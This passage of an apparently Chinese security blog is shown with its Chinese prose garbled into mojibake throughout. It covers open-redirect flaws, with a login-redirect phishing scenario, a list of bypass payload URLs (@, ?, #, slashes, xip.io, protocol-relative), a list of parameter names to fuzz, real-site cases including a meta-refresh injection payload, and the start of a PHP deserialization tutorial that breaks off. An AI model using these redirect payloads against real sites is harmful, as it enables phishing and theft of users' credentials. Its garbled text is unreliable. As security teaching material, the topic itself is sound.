                                        æœ€ç®€å•çš„ä»£ç å®ä¾‹ï¼Œä¹Ÿæ˜¯å¾ˆè´´è¿‘çœŸå®æ¸—é€çš„æ¡ˆä¾‹ï¼Œç™»é™†è·³è½¬ï¼Œåé¢é€šå¸¸æ˜¯åŠ ä¸Šè‡ªå·±ä¸šåŠ¡çš„urlï¼Œä¸€æ—¦å­˜åœ¨urlä»»æ„é‡å®šå‘ï¼Œå‘é€ç»™ç”¨æˆ·ï¼Œä¼šæ¯«ä¸ç–‘é—®çš„è¾“å…¥è´¦å·å¯†ç ç™»é™†ï¼Œç„¶åè·³è½¬åˆ°æˆ‘ä»¬æƒ³è¦ä»–è·³è½¬çš„urlï¼Œæ¯”å¦‚ï¼š</p>
                                    <p>æˆ‘ä»¬å‘é€ç»™ç”¨æˆ·è¿™æ ·çš„urlï¼Œ</p>
                                    <pre><code>http://127.0.0.1/url.php?username=&amp;password=&amp;redict=http://127.0.0.1/fish.php</code></pre>
                                    <p>ç”¨æˆ·æ­£å¸¸è¾“å…¥è´¦å·å¯†ç ç™»é™†ç‚¹å‡»ç™»é™†ã€‚è·³è½¬åˆ°æ„é€ çš„é¡µé¢ã€‚(æˆ‘å¯çœŸæ˜¯ä¸ªé’“é±¼é¬¼æ‰)</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558098332.jpg" alt>
                                    </p>
                                    <p><img src="http://47.106.185.69/1/./img/1558098367.jpg" alt>
                                    </p>
                                    <p>å½“ç„¶é’“é±¼ç•Œé¢å¯ä»¥ä¼ªé€ ä¸€åˆ‡ä½ æƒ³è·å–çš„ä¿¡æ¯ã€‚</p>
                                    <h1 id="bypass"><a href="#bypass" class="headerlink"
                                                       title="bypass"></a>bypass</h1>
                                    <p>
                                        å…¶å®bypassæ²¡ä»€ä¹ˆæ–°çš„å¥—è·¯(æˆ‘æš‚æ—¶æ²¡)ï¼Œéƒ½æ˜¯ç½‘ä¸Šæœ‰çš„ï¼Œå¸ˆå‚…ä»¬å¯ä»¥ç™¾åº¦åˆ°çš„ï¼Œæˆ‘æ•´ç†ä¸€ä¸‹ï¼Œåˆ©ç”¨ä¸Šé¢çš„ä»£ç ç®€å•æµ‹è¯•ï¼Œéƒ½æ˜¯æœ¬åœ°æµ‹è¯•é€šè¿‡çš„ã€‚<a
                                            href="http://www.xiaozhupeiqi.comæ˜¯æœåŠ¡å™¨è¦æ±‚è·³è½¬çš„urlã€‚"
                                            target="_blank" rel="noopener">www.xiaozhupeiqi.comæ˜¯æœåŠ¡å™¨è¦æ±‚è·³è½¬çš„urlã€‚</a>
                                    </p>
                                    <p>1.æœ€å¸¸ç”¨çš„ä¸€æ¡ï¼š@ç»•è¿‡ã€‚</p>
                                    <pre><code>http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.xiaozhupeiqi.com@www.baidu.com //ssrfä¹Ÿå¯ç”¨</code></pre>
                                    <p>2.ç»•è¿‡ä¸€äº›åŒ¹é…ç‰¹å®šå­—ç¬¦ã€‚</p>
                                    <p>ï¼Ÿç»•è¿‡</p>
                                    <pre><code>http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com?www.xiaozhupeiqi.com</code></pre>
                                    <p>#ç»•è¿‡</p>
                                    <pre><code>http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com#www.xiaozhupeiqi.com</code></pre>
                                    <p>3.æ–œæ /ç»•è¿‡</p>
                                    <pre><code>http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com/www.xiaozhupeiqi.com</code></pre>
                                    <p>æˆ–è€…åæ–œçº¿</p>
                                    <pre><code>http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.baidu.com\www.xiaozhupeiqi.com</code></pre>
                                    <p>4.ç™½åå•åŒ¹é…ç»•è¿‡</p>
                                    <pre><code>æ¯”å¦‚åŒ¹é…è§„åˆ™æ˜¯å¿…é¡»è·³è½¬ï¼Œxiaozhupeiqi.com åŸŸåä¸‹ï¼Œ?#ç­‰éƒ½ä¸è¡Œçš„æ—¶å€™ï¼Œå¦‚æœåŒ¹é…è§„åˆ™ä¸ºxiaozhupeiqi.comï¼Œå¯ä»¥å°è¯•ç™¾åº¦inurl:xiaozhupeiqi.comçš„åŸŸåï¼Œæ¯”å¦‚
aaaxiaozhupeiqi.comï¼Œè¿™æ ·åŒæ ·å¯ä»¥ç»•è¿‡ã€‚æ¥ä¸‹æ¥å®æˆ˜ä¸­ä¼šç”¨åˆ°ï¼Œ</code></pre>
                                    <p>5.xip.ioç»•è¿‡</p>
                                    <pre><code>http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=http://www.xiaozhupeiqi.com.220.181.57.217.xip.io</code></pre>
                                    <p>ä¼šè·³è½¬åˆ°ç™¾åº¦</p>
                                    <p>6.ç†æƒ³åŒ–æ–¹æ³•</p>
                                    <pre><code>å¦‚æœæœ‰æœºä¼šåœ¨è‡ªå·±çš„é¡µé¢è®¾ç½®urlè·³è½¬ï¼Œæ¯”å¦‚ç›®æ ‡ç½‘ç«™çš„bbsè®ºå›è‡ªå·±çš„èµ„æ–™é¡µé¢è®¾ç½®urlè·³è½¬ï¼Œæ—¢ç„¶æ˜¯æœåŠ¡å™¨çš„ç½‘ç«™ï¼Œé‚£ä¹ˆurlæ˜¯ä¸ä¼šé™åˆ¶çš„ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæ¼æ´å»æ„é€ å¦ä¸€ä¸ªæ¼æ´ã€‚</code></pre>
                                    <p>7.ç™½åå•ç½‘ç«™å¯ä¿¡</p>
                                    <pre><code>å¦‚æœurlè·³è½¬ç‚¹ä¿¡ä»»ç™¾åº¦urlï¼Œgoogle urlæˆ–è€…å…¶ä»–ï¼Œåˆ™å¯ä»¥å¤šæ¬¡è·³è½¬è¾¾åˆ°è‡ªå·±çš„æ¶æ„ç•Œé¢ã€‚</code></pre>
                                    <p>8.åè®®ç»•è¿‡</p>
                                    <pre><code>httpä¸httpsåè®®è½¬æ¢å°è¯•ï¼Œæˆ–è€…çœç•¥

http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=//www.xiaozhupeiqi.com@www.baidu.com
http://127.0.0.1/url.php?username=1&amp;password=1&amp;password=1&amp;redict=////www.xiaozhupeiqi.com@www.baidu.com//å¤šæ–œçº¿</code></pre>
                                    <p>9.xssè·³è½¬</p>
                                    <pre><code>è¿™ç§å°±æ²¡å•¥è¯´çš„äº†ï¼Œå°±æ˜¯XSSé€ æˆçš„è·³è½¬ï¼Œä¸‹é¢ä¹Ÿæœ‰æ¡ˆä¾‹ï¼Œåœ¨æœ‰äº›æƒ…å†µä¸‹XSSåªèƒ½é€ æˆè·³è½¬çš„å±å®³ã€‚

&lt;meta  content=&quot;1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh&quot;&gt;</code></pre>
                                    <h1 id="fuzzå‡ ä¸ªå‚æ•°"><a href="#fuzzå‡ ä¸ªå‚æ•°" class="headerlink"
                                                         title="fuzzå‡ ä¸ªå‚æ•°"></a>fuzzå‡ ä¸ªå‚æ•°</h1>
                                    <pre><code>redirect

url

redirectUrl

callback

return_url

toUrl

ReturnUrl

fromUrl

redUrl

request

redirect_to

redirect_url

jump

jump_to

target

to

link

linkto

domain</code></pre>
                                    <h1 id="å®æˆ˜å‡ ä¸ªæ¡ˆä¾‹"><a href="#å®æˆ˜å‡ ä¸ªæ¡ˆä¾‹" class="headerlink"
                                                       title="å®æˆ˜å‡ ä¸ªæ¡ˆä¾‹"></a>å®æˆ˜å‡ ä¸ªæ¡ˆä¾‹</h1>
                                    <p>1.æœ€å¸¸è§çš„ç™»é™†è·³è½¬</p>
                                    <p>
                                        ç™»é™†è·³è½¬æˆ‘è®¤ä¸ºæ˜¯æœ€å¸¸è§çš„è·³è½¬ç±»å‹ï¼Œå‡ ä¹ç™¾åˆ†ä¹‹ä¸ƒå…«åç½‘ç«™éƒ½ä¼šurlé‡Œè®¾ç½®è·³è½¬ï¼Œæ‰€ä»¥åœ¨ç™»é™†çš„æ—¶å€™å»ºè®®å¤šè§‚å¯Ÿurlå‚æ•°ï¼Œé€šå¸¸éƒ½ä¼šå­˜åœ¨è·³è½¬è‡³äºå­˜ä¸å­˜åœ¨æ¼æ´éœ€è¦è‡ªå·±æµ‹è¯•ã€‚</p>
                                    <p>ä¸Šé¢çš„ç±»å‹å››,</p>
                                    <p>æ¼æ´url ï¼š</p>
                                    <pre><code>https://xx.xxx.com/User/Login?redirect=http://xxx.com/</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1558101310.jpg" alt>
                                    </p>
                                    <p>ä¸ºç™»é™†é¡µé¢ï¼Œå¦‚æœç™»é™†æˆåŠŸé‚£ä¹ˆè·³è½¬<a
                                            href="http://xxx.com/ï¼Œä½†æ˜¯æ‰€æœ‰æ–¹å¼éƒ½æ— æ³•ç»•è¿‡ï¼Œä½†æ˜¯å‘ç°å¯ä»¥è·³è½¬aaxxx.comï¼Œä¹Ÿå°±æ˜¯åŒ¹é…è§„åˆ™ä¸ºå¿…é¡»ä¸ºxxx.comçš„ç½‘å€ï¼Œä½†æ˜¯aaxxx.comåŒæ ·ä¹Ÿå¯ä»¥ã€‚"
                                            target="_blank" rel="noopener">http://xxx.com/ï¼Œä½†æ˜¯æ‰€æœ‰æ–¹å¼éƒ½æ— æ³•ç»•è¿‡ï¼Œä½†æ˜¯å‘ç°å¯ä»¥è·³è½¬aaxxx.comï¼Œä¹Ÿå°±æ˜¯åŒ¹é…è§„åˆ™ä¸ºå¿…é¡»ä¸ºxxx.comçš„ç½‘å€ï¼Œä½†æ˜¯aaxxx.comåŒæ ·ä¹Ÿå¯ä»¥ã€‚</a>
                                    </p>
                                    <p>æ–¹æ³•ï¼š</p>
                                    <p>ç™¾åº¦
                                        inurl:xxx.comï¼Œå³å¯ç™¾åº¦åˆ°å¾ˆå¤šåŸŸååŒ…å«xxx.comçš„urlï¼Œå³å¯å®ç°è·³è½¬,ä¸å°å¿ƒç™¾åº¦åˆ°ä¸€ä¸ªé»„åŸŸï¼Œæ­£å¥½è¯æ˜å±å®³ç™»é™†è·³XXç½‘ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558101163.jpg" alt>
                                    </p>
                                    <p>è¿˜æœ‰ä¸€äº›èŠ±é‡Œèƒ¡å“¨çš„base64åŠ ç äº†çš„è·³è½¬ï¼Œè§£ç å°±æ˜¯éœ€è¦è·³è½¬çš„url,å…¶å®æœ¬è´¨éƒ½ä¸€æ ·ï¼Œ</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558101492.jpg" alt>
                                    </p>
                                    <p>2.@ç»•è¿‡</p>
                                    <p>@æ˜¯æœ€å¸¸è§çš„ä¸€ç§ç»•è¿‡ã€‚</p>
                                    <p>æ¼æ´url</p>
                                    <pre><code>https://xx.xxx.com/user/goToLogin?toUrl=https://xx.xxx.com@www.baidu.com</code></pre>
                                    <p>è¿™ç§è·³è½¬åœ¨chromeæµè§ˆå™¨å¯ä»¥ç›´æ¥è·³è½¬ï¼Œä½†æ˜¯åœ¨ç«ç‹ä¼šå¼¹æ¡†è¯¢é—®ï¼Œä½†æ˜¯å¹¶ä¸å½±å“å®ƒçš„å±å®³ã€‚</p>
                                    <p>ç«ç‹ä¸‹@çš„è·³è½¬ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558102061.jpg" alt>
                                    </p>
                                    <p>è¿˜æœ‰ä¸€äº›æ˜¯è·³è½¬ç›®å½•çš„ï¼Œ</p>
                                    <p>å¦‚ï¼š</p>
                                    <pre><code>https://xx.xxx.com.cn/?redirect=/user/info.php</code></pre>
                                    <p>ä¿®æ”¹ä¸º</p>
                                    <pre><code>https://xx.xxx.com.cn/?redirect=@www.baidu.com</code></pre>
                                    <p>è¿™ç§æƒ…å†µé€šå¸¸@ä¹Ÿå¯ä»¥è·³è½¬ï¼Œå¤§èƒ†çš„å»å°è¯•</p>
                                    <p>3.å……å€¼æ¥å£è·³è½¬</p>
                                    <p>
                                        é€šå¸¸å……å€¼æ¥å£éƒ½ä¼šè¿›è¡Œè·³è½¬ï¼Œå¦‚å……å€¼æˆåŠŸä¼šè·³è½¬åˆ°å……å€¼å‰è®¿é—®çš„é¡µé¢ï¼Œå› ä¸ºå……å€¼æ¥å£éœ€è¦å……å€¼æ‰èƒ½çŸ¥é“åˆ°åº•å­˜ä¸å­˜åœ¨æ¼æ´ï¼Œæ‰€ä»¥æµ‹è¯•çš„äººç›¸å¯¹å°‘ä¸€äº›ï¼Œå¤§èƒ†å»å°è¯•ï¼Œå•è½¦å˜æ‘©æ‰˜ï¼Œå……å€¼å®Œæˆåè¿˜å¯ä»¥æç°å…¶å®å¹¶ä¸å½±å“ï¼Œä¸å«Œéº»çƒ¦å°±å¤šæµ‹æµ‹ã€‚è¿™äº›éƒ½æ˜¯è·³è½¬æˆåŠŸçš„æ¡ˆä¾‹ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558102491.jpg" alt>
                                    </p>
                                    <p>4.xssé€ æˆçš„urlè·³è½¬</p>
                                    <p>åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•ä¸­ï¼Œç¢°åˆ°ä¸€ä¸ªç«™ç‚¹ï¼Œå¯¹&lt;&gt;â€è¿™äº›å­—ç¬¦éƒ½æ˜¯è¿›è¡Œäº†è¿‡æ»¤ã€‚ä¸”æ²¡æœ‰å…¶ä»–å§¿åŠ¿é…åˆï¼ŒåŸºæœ¬ä¸Šå‘Šåˆ«äº†XSSç­‰æ¼æ´ã€‚å¦‚ä¸‹</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558102982.jpg" alt>
                                    </p>
                                    <p>å¯ä»¥å‘ç°æˆ‘è¾“å…¥äº†xsstest&lt;&gt;â€ï¼Œä½†æ˜¯&lt;&gt;è¢«ç›´æ¥åˆ é™¤è¿‡æ»¤æ‰äº†ï¼Œä½†æ˜¯å‘ç°åŒå¼•å·è¿˜åœ¨ï¼Œå…ˆçœ‹ä¸‹æºç æ˜¯æ€ä¹ˆå¤„ç†çš„ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558103200.jpg" alt>
                                    </p>
                                    <p>ä¹ä¸€çœ‹åŒå¼•å·ä¹Ÿè¢«è½¬ä¹‰äº†ï¼Œè¾“å…¥çš„xsstest
                                        æœç´¢æœ‰åä¸ƒå¤„ï¼Œå¤§éƒ¨åˆ†è¢«å®ä½“åŒ–äº†ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†åŒå¼•å·è¢«urlç¼–ç äº†ï¼Œä½†æ˜¯æ­¤æ—¶çªç„¶å‘ç°æˆ‘ç®­å¤´æŒ‡çš„ä¸€å¤„å¹¶æœªå¯¹åŒå¼•å·è¿›è¡Œè½¬ä¹‰æˆ–è€…è¿‡æ»¤ï¼Œè™½ç„¶&lt;&gt;å·²ç»å®Œå…¨è¢«è¿‡æ»¤æ‰äº†ã€‚</p>
                                    <p>æ­¤æ—¶æ„é€ metaçš„urlè·³è½¬ã€‚</p>
                                    <p>payloadï¼š</p>
                                    <pre><code>http://xxx.com/search?w=1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh&amp;fsearch=yes</code></pre>
                                    <p>å…¶ä¸­è¾“å…¥</p>
                                    <pre><code>1;url=http://www.baidu.com&quot; http-equiv=&quot;refresh</code></pre>
                                    <p>æœ€ç»ˆé—­åˆæ‰å¾—åˆ°çš„æºç ä¸ºã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558103809.jpg" alt>
                                    </p>
                                    <p>æœ€ç»ˆç‚¹å‡»payloadä¼šè·³è½¬ç™¾åº¦é¡µé¢ï¼Œå…¶å®è¿™ä¸ªä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´ç®—XSSé€ æˆçš„è·³è½¬ï¼Œæ„é€ åº”è¯¥ä¹Ÿå¯ä»¥XSSã€‚</p>
                                    <p>5.ä¸šåŠ¡å®Œæˆåè·³è½¬</p>
                                    <p>
                                        è¿™å¯ä»¥å½’ç»“ä¸ºä¸€ç±»è·³è½¬ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹å®Œæˆåè·³è½¬ç™»é™†é¡µé¢ï¼Œç»‘å®šé“¶è¡Œå¡ï¼Œç»‘å®šæˆåŠŸåè¿”å›é“¶è¡Œå¡å……å€¼ç­‰é¡µé¢ï¼Œæˆ–è€…è¯´ç»™å®šä¸€ä¸ªé“¾æ¥åŠç†VIPï¼Œä½†æ˜¯ä½ éœ€è¦è®¤è¯èº«ä»½æ‰èƒ½è®¿é—®è¿™ä¸ªä¸šåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™é€šå¸¸ä¼šç»™å®šä¸€ä¸ªé“¾æ¥ï¼Œè®¤è¯ä¹‹åè·³è½¬åˆ°åˆšåˆšè¦åŠç†VIPçš„é¡µé¢ã€‚</p>
                                    <p>é€šå¸¸è¿™ä¸ªç‚¹éƒ½ä¼šå­˜åœ¨è·³è½¬è‡³äºå­˜ä¸å­˜åœ¨ä»»æ„è·³è½¬ï¼Œå¸ˆå‚…ä»¬è‡ªæµ‹,æœ‰äº›è·³è½¬ä¸šåŠ¡ä¸å¥½ç å°±ä¸å‘äº†ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558155397.jpg" alt>
                                    </p>
                                    <p>6.ç”¨æˆ·äº¤äº’</p>
                                    <p>åœ¨ä¸€äº›ç”¨æˆ·äº¤äº’é¡µé¢ä¹Ÿä¼šå‡ºç°è·³è½¬ï¼Œå¦‚è¯·å¡«å†™å¯¹å®¢æœè¯„ä»·ï¼Œè¯„ä»·æˆåŠŸè·³è½¬ä¸»é¡µï¼Œå¡«å†™é—®å·ï¼Œç­‰ç­‰ä¸šåŠ¡ï¼Œæ³¨æ„è§‚å¯Ÿurlã€‚</p>
                                    <p>é—®å·è°ƒæŸ¥æäº¤è·³è½¬ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1558155773.jpg" alt>
                                    </p>
                                    <p>ps:å¦‚æœæœ‰å…¶ä»–å°æŠ€å·§æˆ‘ä¼šæ›´æ–°åˆ°æœ¬ç¯‡æ–‡ç« ã€‚</p>
                                    <p>å‚è€ƒï¼š<a
                                            href="https://www.anquanke.com/post/id/94377?from=singlemessage"
                                            target="_blank" rel="noopener">https://www.anquanke.com/post/id/94377?from=singlemessage</a>
                                    </p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/04/20/ååºåˆ—åŒ–å­¦ä¹ /">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/04/20/ååºåˆ—åŒ–å­¦ä¹ /"
                                           itemprop="url">PHPååºåˆ—åŒ–å­¦ä¹ </a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-04-20T00:00:00+08:00">
                2019-04-20
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="PHPåºåˆ—åŒ–æµ…æ"><a href="#PHPåºåˆ—åŒ–æµ…æ" class="headerlink"
                                                         title="PHPåºåˆ—åŒ–æµ…æ"></a>PHPåºåˆ—åŒ–æµ…æ</h1>
                                    <p>é¦–å…ˆç®€å•äº†è§£ä¸‹PHP
                                        åºåˆ—åŒ–å‡½æ•°ï¼ŒPHPåºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªå¯¹è±¡ã€æ•°ç»„ã€å­—ç¬¦ä¸²ç­‰è½¬åŒ–ä¸ºå­—èŠ‚æµä¾¿äºä¼ è¾“ï¼Œæ¯”å¦‚è·¨è„šæœ¬ç­‰ã€‚è€ŒPHPååºåˆ—åŒ–æ˜¯å°†åºåˆ—åŒ–ä¹‹åçš„å­—èŠ‚æµè¿˜åŸæˆå¯¹è±¡ã€å­—ç¬¦ã€æ•°ç»„ç­‰ã€‚ä½†æ˜¯PHPåºåˆ—åŒ–æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ã€‚</p>
                                    <p>PHPä»£ç å®ä¾‹ã€‚</p>
                                    <p>åºåˆ—åŒ–æ ¼å¼ã€‚<br> &lt;?php</p>
                                    <pre><code>class CB {
    public $CB_data = &apos;cb&apos;;
}

class test extends CB
{
    public $data;
    public  $pass;
    const SECOND = 60;//å¸¸é‡å€¼

    public function __construct($data, $pass)
    {
      $this-&gt;data = $data;
      $this-&gt;pass = $pass;
    }
}
$number = 66;
$str = &apos;String&apos;;
$bool = true;
$null = NULL;
$arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2);
$cc = new test(&apos;peiqi&apos;, true);

$a=serialize($cc);
echo $a;
echo unserialize($a);
echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;
var_dump(serialize($number));echo &quot;&lt;br/&gt;&quot;;
var_dump(serialize($str));echo &quot;&lt;br/&gt;&quot;;
var_dump(serialize($bool));echo &quot;&lt;br/&gt;&quot;;
var_dump(serialize($null));echo &quot;&lt;br/&gt;&quot;;
var_dump(serialize($arr));echo &quot;&lt;br/&gt;&quot;;
var_dump(serialize($cc));

?&gt;</code></pre>
                                    <p>æ‰“å°å‡ºæ¥</p>
                                    <pre><code>string(5) &quot;i:66;&quot;
string(13) &quot;s:6:&quot;String&quot;;&quot;
string(4) &quot;b:1;&quot;
string(2) &quot;N;&quot;
string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot;
string(76) &quot;O:4:&quot;test&quot;:3:{s:4:&quot;data&quot;;s:5:&quot;peiqi&quot;;s:4:&quot;pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;}&quot;//æ³¨æ„ç§æœ‰å˜é‡å’Œå…±æœ‰å˜é‡åŒºåˆ«ï¼Œç»§æ‰¿çš„å˜é‡å¯ä»¥åºåˆ—åŒ–ä¿å­˜ï¼Œä½†æ˜¯å¸¸é‡ä¸ä¼šä¿å­˜ã€‚</code></pre>
                                    <h2 id="ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–"><a href="#ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–" class="headerlink"
                                                         title="ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–"></a>ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–</h2>
                                    <p>
                                        åºåˆ—åŒ–æ˜¯å°†å˜é‡è½¬æ¢ä¸ºå¯ä¿å­˜æˆ–ä¼ è¾“çš„å­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼›ååºåˆ—åŒ–å°±æ˜¯åœ¨é€‚å½“çš„æ—¶å€™æŠŠè¿™ä¸ªå­—ç¬¦ä¸²å†è½¬åŒ–æˆåŸæ¥çš„å˜é‡ä½¿ç”¨ã€‚è¿™ä¸¤ä¸ªè¿‡ç¨‹ç»“åˆèµ·æ¥ï¼Œå¯ä»¥è½»æ¾åœ°å­˜å‚¨å’Œä¼ è¾“æ•°æ®ï¼Œä½¿ç¨‹åºæ›´å…·ç»´æŠ¤æ€§ã€‚</p>
                                    <p>
                                        å‡è®¾æœ‰ä¸ªclassï¼Œè¿™ä¸ªclassé‡Œé¢å­˜æœ‰ä¸€äº›å˜é‡ã€‚å½“è¿™ä¸ªclassè¢«å®ä¾‹åŒ–äº†ä¹‹åï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­é‡Œé¢çš„ä¸€äº›å˜é‡å€¼å‘ç”Ÿäº†æ”¹å˜ã€‚ä»¥ååœ¨æŸäº›æ—¶å€™è¿˜ä¼šç”¨åˆ°è¿™ä¸ªå˜é‡ï¼Œå¦‚æœæˆ‘ä»¬è®©è¿™ä¸ªclassä¸€ç›´ä¸é”€æ¯ï¼Œç­‰ç€ä¸‹ä¸€æ¬¡è¦ç”¨å®ƒçš„æ—¶å€™å†ä¸€æ¬¡è¢«è°ƒç”¨çš„è¯ï¼Œæµªè´¹ç³»ç»Ÿèµ„æºã€‚å½“æˆ‘ä»¬å†™ä¸€ä¸ªå°å‹çš„é¡¹ç›®å¯èƒ½æ²¡æœ‰å¤ªå¤§çš„å½±å“ï¼Œä½†æ˜¯éšç€é¡¹ç›®çš„å£®å¤§ï¼Œä¸€äº›å°é—®é¢˜è¢«æ”¾å¤§äº†ä¹‹åå°±ä¼šäº§ç”Ÿå¾ˆå¤šéº»çƒ¦ã€‚è¿™ä¸ªæ—¶å€™PHPå°±å’Œæˆ‘ä»¬è¯´ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªå¯¹è±¡åºåˆ—åŒ–äº†ï¼Œå­˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ä½ è¦ç”¨çš„æ—¶å€™å†æ”¾ä»–å‡ºæ¥å°±å¥½äº†ï¼Œä¹Ÿæ­£æ˜¯è¿™ä¸ªç‰¹æ€§ä½¿å¾—å­˜åœ¨äº†PHPååºåˆ—åŒ–æ¼æ´ã€‚</p>
                                    <h1 id="åºåˆ—åŒ–æ¼æ´"><a href="#åºåˆ—åŒ–æ¼æ´" class="headerlink"
                                                      title="åºåˆ—åŒ–æ¼æ´"></a>åºåˆ—åŒ–æ¼æ´</h1>
                                    <p>
                                        è¦äº†è§£PHPååºåˆ—åŒ–æ¼æ´è‡³å…³é‡è¦çš„æ˜¯åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œäº§ç”Ÿåºåˆ—åŒ–æ¼æ´å¾€å¾€æ˜¯æ§åˆ¶äº†å‚æ•°ï¼Œè°ƒç”¨äº†é­”æœ¯æ–¹æ³•ï¼Œç„¶åé€ æˆæ¼æ´ã€‚é­”æ³•å‡½æ•°ä¸€èˆ¬æ˜¯ä»¥__å¼€å¤´ï¼Œé€šå¸¸ä¼šå› ä¸ºæŸäº›æ¡ä»¶è€Œè§¦å‘ä¸ç”¨æˆ‘ä»¬æ‰‹åŠ¨è°ƒç”¨ã€‚</p>
                                    <h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink"
                                                     title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2>
                                    <pre><code>1.__constructï¼Œ__destruct
__constructæ„å»ºå¯¹è±¡çš„æ—¶è¢«è°ƒç”¨ï¼›
__destructæ˜ç¡®é”€æ¯å¯¹è±¡æˆ–è„šæœ¬ç»“æŸæ—¶è¢«è°ƒç”¨ï¼›
2.__getï¼Œ__set
__setå½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨
__getè¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨
3.__issetï¼Œ__unset
__issetå¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨
__unsetå¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è¿›è¡Œunsetæ—¶è¢«è°ƒç”¨
4.__callï¼Œ__callStatic
__callè°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨
__callStaticè°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ—¶è¢«è°ƒç”¨
5.__sleepï¼Œ__wakeup
__sleepå½“ä½¿ç”¨serializeæ—¶è¢«è°ƒç”¨ï¼Œå½“ä½ ä¸éœ€è¦ä¿å­˜å¤§å¯¹è±¡çš„æ‰€æœ‰æ•°æ®æ—¶å¾ˆæœ‰ç”¨
__wakeupå½“ä½¿ç”¨unserializeæ—¶è¢«è°ƒç”¨ï¼Œå¯ç”¨äºåšäº›å¯¹è±¡çš„åˆå§‹åŒ–æ“ä½œ
6.__clone
è¿›è¡Œå¯¹è±¡cloneæ—¶è¢«è°ƒç”¨ï¼Œç”¨æ¥è°ƒæ•´å¯¹è±¡çš„å…‹éš†è¡Œä¸º
7.__toString
å½“ä¸€ä¸ªç±»è¢«è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶è¢«è°ƒç”¨
8.__invoke
å½“ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨å¯¹è±¡æ—¶è¢«è°ƒç”¨
9.__set_state
å½“è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•è¢«è°ƒç”¨ã€‚ç”¨__set_stateçš„è¿”å›å€¼åšä¸ºvar_exportçš„è¿”å›å€¼ã€‚
10.__debuginfo
